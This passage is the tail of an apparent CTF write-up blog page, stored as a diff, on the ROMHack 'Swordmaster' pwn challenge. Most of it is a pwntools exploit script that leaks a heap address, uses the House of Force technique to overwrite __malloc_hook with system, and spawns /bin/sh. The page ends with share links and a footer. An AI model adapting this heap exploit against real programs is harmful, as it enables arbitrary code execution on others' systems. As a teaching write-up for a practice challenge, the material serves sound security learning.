+</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Class: '</span><span class="p">)</span>  
+  
+<span class="n">heap</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  
+<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4800</span> <span class="o">-</span> <span class="mh">0x10</span>  
+  
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAKED HEAP BASE: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)))</span>  
+  
+<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
+  
+  
+  
+<span class="c1"># ---- House Of Force Set-Up ----  
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span><span class="o">*</span><span class="mi">47</span><span class="p">)</span>  
+  
+<span class="c1"># ---- Point top chunk to __malloc_hook ----  
+</span><span class="n">distance</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1330</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>  
+<span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="s">'dummy'</span><span class="p">)</span>  
+  
+<span class="c1"># ---- Overwrite __malloc_hook with system ----  
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>  
+  
+<span class="c1"># ---- Point cmd at our name (/bin/sh) and call malloc to execute our overwritten hook ----  
+</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1270</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>  
+  
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/img_swordmaster/exploit_success.png" alt="full exploit" /></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=UAF+and+House+Of+Force+Fun+-+ROMHack+CTF+Swordmaster+Pwn+Challenge%20-%20https://stigward.github.io/posts/swordmaster-pwn-chal/%20by%20@_stigward" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://stigward.github.io/posts/swordmaster-pwn-chal/" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    &copy; 2026 Stig's Lab Notes.
+    Built with <a href="https://github.com/nielsenramon/chalk" rel="noreferrer noopener" target="_blank" title="Chalk theme for Jekyll">Chalk</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QK87P1LVPH"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-QK87P1LVPH');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-bcef26dde016217d3eab202f42759aae5d17330fdb76331068f6269a84d8437f.js" integrity="sha256-vO8m3eAWIX0+qyAvQnWarl0XMw/bdjMQaPYmmoTYQ38=" crossorigin="anonymous"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-cd7eae67265bcd101d0f598456b16171b2533d714dcc3a5b6ddacfdf234c4cbc.js" integrity="sha256-zX6uZyZbzRAdD1mEVrFhcbJTPXFNzDpbbdrP3yNMTLw=" crossorigin="anonymous"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-7691f37e9154c7d53f7515a518dbb0faf3a73d9b3d5b75522867a134952d0a76.js" integrity="sha256-dpHzfpFUx9U/dRWlGNuw+vOnPZs9W3VSKGehNJUtCnY=" crossorigin="anonymous"></script>
+
+
+<script type="text/javascript" src="/assets/application-7b6260deb98e64a8a42b97f5c18ad2a8c9507d70f9a097a440b354770f979dc7.js" integrity="sha256-e2Jg3rmOZKikK5f1wYrSqMlQfXD5oJekQLNUdw+Xncc=" crossorigin="anonymous"></script>
+
+
+</body>
+</html>
